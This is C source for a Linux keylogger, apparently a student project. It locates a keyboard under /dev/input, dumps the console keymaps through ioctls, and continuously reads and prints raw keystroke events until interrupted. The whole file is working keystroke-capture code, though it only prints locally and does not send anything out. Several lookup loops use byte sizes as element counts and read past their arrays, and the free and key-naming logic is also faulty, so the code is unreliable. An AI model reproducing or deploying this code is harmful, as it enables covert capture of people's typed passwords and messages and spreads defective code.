/* ************************************************************************** */
/*                                                                            */
/*                                                        :::      ::::::::   */
/*   main.c                                             :+:      :+:    :+:   */
/*                                                    +:+ +:+         +:+     */
/*   By: root </var/mail/root>                      +#+  +:+       +#+        */
/*                                                +#+#+#+#+#+   +#+           */
/*   Created: 2018/09/28 05:57:11 by root              #+#    #+#             */
/*   Updated: 2018/10/08 20:01:12 by gbourgeo         ###   ########.fr       */
/*                                                                            */
/* ************************************************************************** */

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <sys/ioctl.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <dirent.h>
#include <linux/input.h>
#include <signal.h>
#include <linux/keyboard.h>
#include <linux/kd.h>
#include <errno.h>

#ifndef MAX_NR_KEYMAPS
# define MAX_NR_KEYMAPS NR_KEYMAPS
#endif

int					loop;

typedef struct 		s_event
{
	int				value;
	char 			*name;
}					t_event;

t_event	event[] = {
	{ EV_SYN, 				"EV_SYN" },
	{ EV_KEY, 				"EV_KEY" },
	{ EV_REL, 				"EV_REL" },
	{ EV_ABS, 				"EV_ABS" },
	{ EV_MSC, 				"EV_MSC" },
	{ EV_SW,				"EV_SW" },
	{ EV_LED,				"EV_LED" },
	{ EV_SND, 				"EV_SND" },
	{ EV_REP, 				"EV_REP" },
	{ EV_FF, 				"EV_FF" },
	{ EV_PWR, 				"EV_PWR" },
	{ EV_FF_STATUS, 		"EV_FF_STATUS" }
};

t_event msc[] = {
	{ MSC_SERIAL,			"MSC_SERIAL" },
	{ MSC_PULSELED,			"MSC_PULSELED" },
	{ MSC_GESTURE,			"MSC_GESTURE" },
	{ MSC_RAW,				"MSC_RAW" },
	{ MSC_SCAN,				"MSC_SCAN" },
	{ MSC_TIMESTAMP,		"MSC_TIMESTAMP" }
};

t_event led[] = {
	{ LED_NUML, 			"LED_NUML" },
	{ LED_CAPSL, 			"LED_CAPSL" },
	{ LED_SCROLLL, 			"LED_SCROLLL" },
	{ LED_COMPOSE, 			"LED_COMPOSE" },
	{ LED_KANA, 			"LED_KANA" },
	{ LED_SLEEP, 			"LED_SLEEP" },
	{ LED_SUSPEND, 			"LED_SUSPEND" },
	{ LED_MUTE, 			"LED_MUTE" },
	{ LED_MISC, 			"LED_MISC" },
	{ LED_MAIL, 			"LED_MAIL" },
	{ LED_CHARGING, 		"LED_CHARGING" }
};

t_event key[] = {
	{ KEY_RESERVED,			"KEY_RESERVED" },
	{ KEY_ESC,				"KEY_ESC" },
	{ KEY_1,				"KEY_1" },
	{ KEY_2,				"KEY_2" },
	{ KEY_3,				"KEY_3" },
	{ KEY_4,				"KEY_4" },
	{ KEY_5,				"KEY_5" },
	{ KEY_6,				"KEY_6" },
	{ KEY_7,				"KEY_7" },
	{ KEY_8,				"KEY_8" },
	{ KEY_9,				"KEY_9" },
	{ KEY_0,				"KEY_0" },
	{ KEY_MINUS,			"KEY_MINUS" },
	{ KEY_EQUAL,			"KEY_EQUAL" },
	{ KEY_BACKSPACE,		"KEY_BACKSPACE" },
	{ KEY_TAB,				"KEY_TAB" },
	{ KEY_Q,				"KEY_Q" },
	{ KEY_W,				"KEY_W" },
	{ KEY_E,				"KEY_E" },
	{ KEY_R,				"KEY_R" },
	{ KEY_T,				"KEY_T" },
	{ KEY_Y,				"KEY_Y" },
	{ KEY_U,				"KEY_U" },
	{ KEY_I,				"KEY_I" },
	{ KEY_O,				"KEY_O" },
	{ KEY_P,				"KEY_P" },
	{ KEY_LEFTBRACE,		"KEY_LEFTBRACE" },
	{ KEY_RIGHTBRACE,		"KEY_RIGHTBRACE" },
	{ KEY_ENTER,			"KEY_ENTER" },
	{ KEY_LEFTCTRL,			"KEY_LEFTCTRL" },
	{ KEY_A,				"KEY_A" },
	{ KEY_S,				"KEY_S" },
	{ KEY_D,				"KEY_D" },
	{ KEY_F,				"KEY_F" },
	{ KEY_G,				"KEY_G" },
	{ KEY_H,				"KEY_H" },
	{ KEY_J,				"KEY_J" },
	{ KEY_K,				"KEY_K" },
	{ KEY_L,				"KEY_L" },
	{ KEY_SEMICOLON,		"KEY_SEMICOLON" },
	{ KEY_APOSTROPHE,		"KEY_APOSTROPHE" },
	{ KEY_GRAVE,			"KEY_GRAVE" },
	{ KEY_LEFTSHIFT,		"KEY_LEFTSHIFT" },
	{ KEY_BACKSLASH,		"KEY_BACKSLASH" },
	{ KEY_Z,				"KEY_Z" },
	{ KEY_X,				"KEY_X" },
	{ KEY_C,				"KEY_C" },
	{ KEY_V,				"KEY_V" },
	{ KEY_B,				"KEY_B" },
	{ KEY_N,				"KEY_N" },
	{ KEY_M,				"KEY_M" },
	{ KEY_COMMA,			"KEY_COMMA" },
	{ KEY_DOT,				"KEY_DOT" },
	{ KEY_SLASH,			"KEY_SLASH" },
	{ KEY_RIGHTSHIFT,		"KEY_RIGHTSHIFT" },
	{ KEY_KPASTERISK,		"KEY_KPASTERISK" },
	{ KEY_LEFTALT,			"KEY_LEFTALT" },
	{ KEY_SPACE,			"KEY_SPACE" },
	{ KEY_CAPSLOCK,			"KEY_CAPSLOCK" },
	{ KEY_F1,				"KEY_F1" },
	{ KEY_F2,				"KEY_F2" },
	{ KEY_F3,				"KEY_F3" },
	{ KEY_F4,				"KEY_F4" },
	{ KEY_F5,				"KEY_F5" },
	{ KEY_F6,				"KEY_F6" },
	{ KEY_F7,				"KEY_F7" },
	{ KEY_F8,				"KEY_F8" },
	{ KEY_F9,				"KEY_F9" },
	{ KEY_F10,				"KEY_F10" },
	{ KEY_NUMLOCK,			"KEY_NUMLOCK" },
	{ KEY_SCROLLLOCK,		"KEY_SCROLLLOCK" },
	{ KEY_KP7,				"KEY_KP7" },
	{ KEY_KP8,				"KEY_KP8" },
	{ KEY_KP9,				"KEY_KP9" },
	{ KEY_KPMINUS,			"KEY_KPMINUS" },
	{ KEY_KP4,				"KEY_KP4" },
	{ KEY_KP5,				"KEY_KP5" },
	{ KEY_KP6,				"KEY_KP6" },
	{ KEY_KPPLUS,			"KEY_KPPLUS" },
	{ KEY_KP1,				"KEY_KP1" },
	{ KEY_KP2,				"KEY_KP2" },
	{ KEY_KP3,				"KEY_KP3" },
	{ KEY_KP0,				"KEY_KP0" },
	{ KEY_KPDOT,			"KEY_KPDOT" },
	{ KEY_ZENKAKUHANKAKU,	"KEY_ZENKAKUHANKAKU" },
	{ KEY_102ND,			"KEY_102ND" },
	{ KEY_F11,				"KEY_F11" },
	{ KEY_F12,				"KEY_F12" },
	{ KEY_RO,				"KEY_RO" },
	{ KEY_KATAKANA,			"KEY_KATAKANA" },
	{ KEY_HIRAGANA,			"KEY_HIRAGANA" },
	{ KEY_HENKAN,			"KEY_HENKAN" },
	{ KEY_KATAKANAHIRAGANA,	"KEY_KATAKANAHIRAGANA" },
	{ KEY_MUHENKAN,			"KEY_MUHENKAN" },
	{ KEY_KPJPCOMMA,		"KEY_KPJPCOMMA" },
	{ KEY_KPENTER,			"KEY_KPENTER" },
	{ KEY_RIGHTCTRL,		"KEY_RIGHTCTRL" },
	{ KEY_KPSLASH,			"KEY_KPSLASH" },
	{ KEY_SYSRQ,			"KEY_SYSRQ" },
	{ KEY_RIGHTALT,			"KEY_RIGHTALT" },
	{ KEY_LINEFEED,			"KEY_LINEFEED" },
	{ KEY_HOME,				"KEY_HOME" },
	{ KEY_UP,				"KEY_UP" },
	{ KEY_PAGEUP,			"KEY_PAGEUP" },
	{ KEY_LEFT,				"KEY_LEFT" },
	{ KEY_RIGHT,			"KEY_RIGHT" },
	{ KEY_END,				"KEY_END" },
	{ KEY_DOWN,				"KEY_DOWN" },
	{ KEY_PAGEDOWN,			"KEY_PAGEDOWN" },
	{ KEY_INSERT,			"KEY_INSERT" },
	{ KEY_DELETE,			"KEY_DELETE" },
	{ KEY_MACRO,			"KEY_MACRO" },
	{ KEY_MUTE,				"KEY_MUTE" },
	{ KEY_VOLUMEDOWN,		"KEY_VOLUMEDOWN" },
	{ KEY_VOLUMEUP,			"KEY_VOLUMEUP" },
	{ KEY_POWER,			"KEY_POWER" },
	{ KEY_KPEQUAL,			"KEY_KPEQUAL" },
	{ KEY_KPPLUSMINUS,		"KEY_KPPLUSMINUS" },
	{ KEY_PAUSE,			"KEY_PAUSE" },
	{ KEY_SCALE,			"KEY_SCALE" },
	{ KEY_KPCOMMA,			"KEY_KPCOMMA" },
	{ KEY_HANGEUL,			"KEY_HANGEUL" },
	{ KEY_HANGUEL,			"KEY_HANGUEL" },
	{ KEY_HANJA,			"KEY_HANJA" },
	{ KEY_YEN,				"KEY_YEN" },
	{ KEY_LEFTMETA,			"KEY_LEFTMETA" },
	{ KEY_RIGHTMETA,		"KEY_RIGHTMETA" },
	{ KEY_COMPOSE,			"KEY_COMPOSE" },
	{ KEY_STOP,				"KEY_STOP" },
	{ KEY_AGAIN,			"KEY_AGAIN" },
	{ KEY_PROPS,			"KEY_PROPS" },
	{ KEY_UNDO,				"KEY_UNDO" },
	{ KEY_FRONT,			"KEY_FRONT" },
	{ KEY_COPY,				"KEY_COPY" },
	{ KEY_OPEN,				"KEY_OPEN" },
	{ KEY_PASTE,			"KEY_PASTE" },
	{ KEY_FIND,				"KEY_FIND" },
	{ KEY_CUT,				"KEY_CUT" },
	{ KEY_HELP,				"KEY_HELP" },
	{ KEY_MENU,				"KEY_MENU" },
	{ KEY_CALC,				"KEY_CALC" },
	{ KEY_SETUP,			"KEY_SETUP" },
	{ KEY_SLEEP,			"KEY_SLEEP" },
	{ KEY_WAKEUP,			"KEY_WAKEUP" },
	{ KEY_FILE,				"KEY_FILE" },
	{ KEY_SENDFILE,			"KEY_SENDFILE" },
	{ KEY_DELETEFILE,		"KEY_DELETEFILE" },
	{ KEY_XFER,				"KEY_XFER" },
	{ KEY_PROG1,			"KEY_PROG1" },
	{ KEY_PROG2,			"KEY_PROG2" },
	{ KEY_WWW,				"KEY_WWW" },
	{ KEY_MSDOS,			"KEY_MSDOS" },
	{ KEY_COFFEE,			"KEY_COFFEE" },
	{ KEY_SCREENLOCK,		"KEY_SCREENLOCK" },
	{ KEY_ROTATE_DISPLAY,	"KEY_ROTATE_DISPLAY" },
	{ KEY_DIRECTION,		"KEY_DIRECTION" },
	{ KEY_CYCLEWINDOWS,		"KEY_CYCLEWINDOWS" },
	{ KEY_MAIL,				"KEY_MAIL" },
	{ KEY_BOOKMARKS,		"KEY_BOOKMARKS" },
	{ KEY_COMPUTER,			"KEY_COMPUTER" },
	{ KEY_BACK,				"KEY_BACK" },
	{ KEY_FORWARD,			"KEY_FORWARD" },
	{ KEY_CLOSECD,			"KEY_CLOSECD" },
	{ KEY_EJECTCD,			"KEY_EJECTCD" },
	{ KEY_EJECTCLOSECD,		"KEY_EJECTCLOSECD" },
	{ KEY_NEXTSONG,			"KEY_NEXTSONG" },
	{ KEY_PLAYPAUSE,		"KEY_PLAYPAUSE" },
	{ KEY_PREVIOUSSONG,		"KEY_PREVIOUSSONG" },
	{ KEY_STOPCD,			"KEY_STOPCD" },
	{ KEY_RECORD,			"KEY_RECORD" },
	{ KEY_REWIND,			"KEY_REWIND" },
	{ KEY_PHONE,			"KEY_PHONE" },
	{ KEY_ISO,				"KEY_ISO" },
	{ KEY_CONFIG,			"KEY_CONFIG" },
	{ KEY_HOMEPAGE,			"KEY_HOMEPAGE" },
	{ KEY_REFRESH,			"KEY_REFRESH" },
	{ KEY_EXIT,				"KEY_EXIT" },
	{ KEY_MOVE,				"KEY_MOVE" },
	{ KEY_EDIT,				"KEY_EDIT" },
	{ KEY_SCROLLUP,			"KEY_SCROLLUP" },
	{ KEY_SCROLLDOWN,		"KEY_SCROLLDOWN" },
	{ KEY_KPLEFTPAREN,		"KEY_KPLEFTPAREN" },
	{ KEY_KPRIGHTPAREN,		"KEY_KPRIGHTPAREN" },
	{ KEY_NEW,				"KEY_NEW" },
	{ KEY_REDO,				"KEY_REDO" },
	{ KEY_F13,				"KEY_F13" },
	{ KEY_F14,				"KEY_F14" },
	{ KEY_F15,				"KEY_F15" },
	{ KEY_F16,				"KEY_F16" },
	{ KEY_F17,				"KEY_F17" },
	{ KEY_F18,				"KEY_F18" },
	{ KEY_F19,				"KEY_F19" },
	{ KEY_F20,				"KEY_F20" },
	{ KEY_F21,				"KEY_F21" },
	{ KEY_F22,				"KEY_F22" },
	{ KEY_F23,				"KEY_F23" },
	{ KEY_F24,				"KEY_F24" },
	{ KEY_PLAYCD,			"KEY_PLAYCD" },
	{ KEY_PAUSECD,			"KEY_PAUSECD" },
	{ KEY_PROG3,			"KEY_PROG3" },
	{ KEY_PROG4,			"KEY_PROG4" },
	{ KEY_DASHBOARD,		"KEY_DASHBOARD" },
	{ KEY_SUSPEND,			"KEY_SUSPEND" },
	{ KEY_CLOSE,			"KEY_CLOSE" },
	{ KEY_PLAY,				"KEY_PLAY" },
	{ KEY_FASTFORWARD,		"KEY_FASTFORWARD" },
	{ KEY_BASSBOOST,		"KEY_BASSBOOST" },
	{ KEY_PRINT,			"KEY_PRINT" },
	{ KEY_HP,				"KEY_HP" },
	{ KEY_CAMERA,			"KEY_CAMERA" },
	{ KEY_SOUND,			"KEY_SOUND" },
	{ KEY_QUESTION,			"KEY_QUESTION" },
	{ KEY_EMAIL,			"KEY_EMAIL" },
	{ KEY_CHAT,				"KEY_CHAT" },
	{ KEY_SEARCH,			"KEY_SEARCH" },
	{ KEY_CONNECT,			"KEY_CONNECT" },
	{ KEY_FINANCE,			"KEY_FINANCE" },
	{ KEY_SPORT,			"KEY_SPORT" },
	{ KEY_SHOP,				"KEY_SHOP" },
	{ KEY_ALTERASE,			"KEY_ALTERASE" },
	{ KEY_CANCEL,			"KEY_CANCEL" },
	{ KEY_BRIGHTNESSDOWN,	"KEY_BRIGHTNESSDOWN" },
	{ KEY_BRIGHTNESSUP,		"KEY_BRIGHTNESSUP" },
	{ KEY_MEDIA,			"KEY_MEDIA" },
	{ KEY_SWITCHVIDEOMODE,	"KEY_SWITCHVIDEOMODE" },
	{ KEY_KBDILLUMTOGGLE,	"KEY_KBDILLUMTOGGLE" },
	{ KEY_KBDILLUMDOWN,		"KEY_KBDILLUMDOWN" },
	{ KEY_KBDILLUMUP,		"KEY_KBDILLUMUP" },
	{ KEY_SEND,				"KEY_SEND" },
	{ KEY_REPLY,			"KEY_REPLY" },
	{ KEY_FORWARDMAIL,		"KEY_FORWARDMAIL" },
	{ KEY_SAVE,				"KEY_SAVE" },
	{ KEY_DOCUMENTS,		"KEY_DOCUMENTS" },
	{ KEY_BATTERY,			"KEY_BATTERY" },
	{ KEY_BLUETOOTH,		"KEY_BLUETOOTH" },
	{ KEY_WLAN,				"KEY_WLAN" },
	{ KEY_UWB,				"KEY_UWB" },
	{ KEY_UNKNOWN,			"KEY_UNKNOWN" },
	{ KEY_VIDEO_NEXT,		"KEY_VIDEO_NEXT" },
	{ KEY_VIDEO_PREV,		"KEY_VIDEO_PREV" },
	{ KEY_BRIGHTNESS_CYCLE,	"KEY_BRIGHTNESS_CYCLE" },
	{ KEY_BRIGHTNESS_AUTO,	"KEY_BRIGHTNESS_AUTO" },
	{ KEY_BRIGHTNESS_ZERO,	"KEY_BRIGHTNESS_ZERO" },
	{ KEY_DISPLAY_OFF,		"KEY_DISPLAY_OFF" },
	{ KEY_WWAN,				"KEY_WWAN" },
	{ KEY_WIMAX,			"KEY_WIMAX" },
	{ KEY_RFKILL,			"KEY_RFKILL" },
	{ KEY_MICMUTE,			"KEY_MICMUTE" }
};

t_event modifiers[] = {
	{ KG_SHIFT,				"shift"},
	{ KG_ALTGR,				"altgr"},
	{ KG_CTRL,				"control"},
	{ KG_ALT,				"alt"},
	{ KG_SHIFTL,			"shiftl"},
	{ KG_SHIFTR,			"shiftr"},
	{ KG_CTRLL,				"ctrll"},
	{ KG_CTRLR,				"ctrlr"}
};

void 					sigint(int sig)
{
	(void)sig;
	loop = 0;
}

static int			filter(const struct dirent *file)
{
	char			filename[512];
	struct stat		filestat;

	snprintf(filename, sizeof(filename), "%s%s", "/dev/input/", file->d_name);
	if (stat(filename, &filestat))
		return 0;
	return S_ISCHR(filestat.st_mode);
}

static char			*get_keyboard()
{
	int				num;
	struct dirent	**files;
	int32_t			event_bitmap;
	int32_t			keybd_bitmap;
	char			filename[512];
	int				fd;
	char			*keybd;

	if ((num = scandir("/dev/input/", &files, &filter, &alphasort)) < 0)
		return NULL;
	keybd = NULL;
	for (int i = 0; i < num; i++)
	{
		if (!keybd)
		{
			event_bitmap = 0;
			keybd_bitmap = KEY_A | KEY_B | KEY_C | KEY_Z;
			snprintf(filename, sizeof(filename), "%s%s", "/dev/input/", files[i]->d_name);
			fd = open(filename, O_RDONLY);
			if (fd != -1)
			{
				ioctl(fd, EVIOCGBIT(0, sizeof(event_bitmap)), &event_bitmap);
				if ((EV_KEY & event_bitmap) == EV_KEY)
				{
					ioctl(fd, EVIOCGBIT(EV_KEY, sizeof(event_bitmap)), &event_bitmap);
					if ((keybd_bitmap & event_bitmap) == keybd_bitmap)
						keybd = strdup(filename);
				}
				close(fd);
			}
		}
		free(files[i]);
	}
	free(files);
	return keybd;
}

static void				keylogger(int keybd, int **key_table, int nb_keys, int nb_keymap)
{
	int					nbread;
	struct input_event	events[128];
	int 				modifier;

	signal(SIGINT, sigint);
	loop = 1;
	while (loop)
	{
		nbread = read(keybd, events, sizeof(struct input_event) * 128);
		for (size_t i = 0; i < nbread / sizeof(struct input_event); i++)
		{
			char *name = "UNKNOWN";
			for (size_t j = 0; j < sizeof(event); j++)
			{
				if (events[i].type == event[j].value)
				{
					name = event[j].name;
					break ;
				}
			}
			printf("\ntype: %s ", name);
			if (events[i].type == EV_KEY)
			{
				int value = events[i].code;
				int c = (events[i].code < nb_keys) ? key_table[events[i].code][0] : -1;
				printf("code: %c(%x) ", c, value);
			}
			else if (events[i].type == EV_LED)
			{
				name = "UNKNOWN";
				for (size_t j = 0; j < sizeof(led); j++)
				{
					if (events[i].code == led[j].value)
					{
						name = led[j].name;
						break ;
					}
				}
				printf("code: %s ", name);
			}
			else if (events[i].type == EV_MSC)
			{
				name = "UNKNOWN";
				for (size_t j = 0; j < sizeof(key); j++)
				{
					if (events[i].code == msc[j].value)
					{
						name = msc[j].name;
						break ;
					}
				}
				printf("code: %s ", name);
			} else {
				printf("code: %x ", events[i].code);
			}
			printf("value: %#06x ; ", events[i].value);
		}
		printf("\n");
	}
}

int 				get_fd();
int					get_keymaps(int, int (*)[256]);
int					**dump_keys(int, int, int, int (*)[256]);

static int			has_keys(int fd, int n)
{
	struct kbentry	ke;

	ke.kb_table = 0;
	ke.kb_index = n;
	return !ioctl(fd, KDGKBENT, (unsigned long)&ke);
}

static void 		free_tab(int ***tab)
{
	int			**ptr;

	if (tab && *tab)
	{
		ptr = *tab;
		while (ptr)
			free(*ptr++);
		free(*tab);
		*tab = NULL;
	}
}

int					main(void)
{
	int				fd;
	int				nb_keys;
	int 			nb_keymap;
	int 			keymaps[2][MAX_NR_KEYMAPS];
	int				**key_table;
	char			*keyboard;

	if ((fd = get_fd()) < 0)
		return 1;
	nb_keys = (has_keys(fd, 255) ? 256 : has_keys(fd, 127) ? 128 : 112);
	if ((nb_keymap = get_keymaps(fd, keymaps)) == 0)
		return 1;
	key_table = dump_keys(fd, nb_keys, nb_keymap, keymaps);
	close(fd);
	if (key_table == NULL)
		return 1;
	if ((keyboard = get_keyboard()) == NULL) {
		free_tab(&key_table);
		return 1;
	}
	if ((fd = open(keyboard, O_RDONLY)) < 0) {
		free(keyboard);
		free_tab(&key_table);
		return 1;
	}
	printf("keyboard: %s\n", keyboard);
	free(keyboard);
	keylogger(fd, key_table, nb_keys, nb_keymap);
	close(fd);
	return 0;
}

static int			is_a_console(int fd)
{
	char			arg;

	arg = 0;
	return (ioctl(fd, KDGKBTYPE, &arg) == 0 && ((arg == KB_101) || (arg == KB_84)));
}

int					get_fd()
{
	char			*console[] = { "/dev/tty", "/dev/tty0", "/dev/vc/0", "/dev/console" };
	int				fd;

	fd = -1;
	for (size_t i = 0; i < sizeof(console) / sizeof(*console); i++)
	{
		fd = open(console[i], O_RDWR);
		if (fd < 0 && errno == EACCES)
			fd = open(console[i], O_WRONLY);
		if (fd < 0 && errno == EACCES)
			fd = open(console[i], O_RDONLY);
		if (fd < 0)
			continue ;
		if (is_a_console(fd))
			break ;
		close(fd);
		fd = -1;
	}
	if (fd < 0)
		for (fd = 0; fd < 3; fd++)
			if (is_a_console(fd))
				break ;
	if (fd < 0)
		fprintf(stderr, "Can't get a file descriptor refering to a terminal\n");
	return fd;
}

int					get_keymaps(int fd, int keymaps[2][256])
{
	int 			keymapnbr;
	struct kbentry	ke;

	printf("KEYMAPS\n");
	keymapnbr = 0;
	for (int i = 0; i < MAX_NR_KEYMAPS; i++)	
	{
		ke.kb_index = 0;
		ke.kb_table = i;
		int j = ioctl(fd, KDGKBENT, (unsigned long)&ke);
		if (j && errno != EINVAL) {
			perror("KDGKBENT");
			fprintf(stderr, "KDBGENT error at index 0 in table %d\n", i);
			return 0;
		}
		if (!j && ke.kb_value != K_NOSUCHMAP) {
			keymaps[0][i] = keymapnbr;
			keymaps[1][keymapnbr++] = i;
		} else {
			keymaps[0][i] = -1;
		}
		printf("%03d %-5d %-15d %d\n", i, keymaps[0][i], keymaps[1][keymapnbr], keymapnbr);
	}
	if (keymapnbr == 0)
		fprintf(stderr, "cannot find any keymaps\n");
	if (keymaps[1][0] != 0)
		fprintf(stderr, "plain map not alocated !? oO ?!");
	return keymapnbr;
}

static int			**allocate_keys(size_t len1, size_t len2)
{
	int				**key_table;

	key_table = malloc(sizeof(*key_table) * (len1 + 1));
	if (key_table == NULL) {
		fprintf(stderr, "Can't allocate %do for keys\n", len1);
		return NULL;
	}
	for (int i = 0; i < len1; i++)
	{
		key_table[i] = malloc(sizeof(**key_table) * len2);
		if (key_table[i] == NULL) {
			fprintf(stderr, "Can't allocate %do for %dth key\n", len2, i);
			for (int j = 0; j < i; j++)
				free(key_table[j]);
			free(key_table);
			return NULL;
		}
	}
	key_table[len1] = NULL;
	return key_table;
}

static int			get_bind(int fd, u_char index, u_char table)
{
	struct kbentry	ke;

	ke.kb_index = index;
	ke.kb_table = table;
	if (ioctl(fd, KDGKBENT, (unsigned long)&ke)) {
		perror("KDGKBENT");
		fprintf(stderr, "KDGKBENT error at index %d in table %d\n", index, table);
		return -1;
	}
	return ke.kb_value;
}

int 				**dump_keys(int fd, int nb_keys, int nb_keymap, int keymaps[2][256])
{
	int				**key_table;

	printf("DUMPKEYS\n");
	key_table = allocate_keys(nb_keys, nb_keymap);
	if (key_table == NULL) {
		return NULL;
	}
	for (int i = 0; i < nb_keys; i++) {
		printf("%03d(%s):\n", i, key[i].name);
		for (int j = 0; j < nb_keymap; j++) {
			key_table[i][j] = get_bind(fd, i, keymaps[1][j]);
			printf(" %d %x(%c) -", keymaps[1][j], key_table[i][j], key_table[i][j]);
		}
		printf("\n");
	}
	return key_table;
}
